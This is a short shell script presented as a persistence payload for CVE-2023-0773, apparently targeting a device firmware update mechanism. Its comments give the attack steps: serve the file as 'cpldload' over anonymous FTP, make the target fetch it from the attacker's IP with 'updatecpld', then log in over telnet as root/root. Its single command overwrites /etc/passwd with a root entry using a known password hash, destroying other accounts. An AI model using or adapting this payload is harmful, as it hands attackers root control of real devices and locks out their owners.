#!/bin/sh
# cpldload_passwd_reset.sh - CVE-2023-0773 persistence payload
# Resets root password to "root" (hash: dIkAjCy0Zma2s)
# Usage: Serve this file as "cpldload" on anonymous FTP server
# Then from uvsh: updatecpld <attacker_ip>
# Connect: telnet <target> 23 with root/root

echo 'root:dIkAjCy0Zma2s:0:0:Linux User,,,:/root:/bin/sh' > /etc/passwd
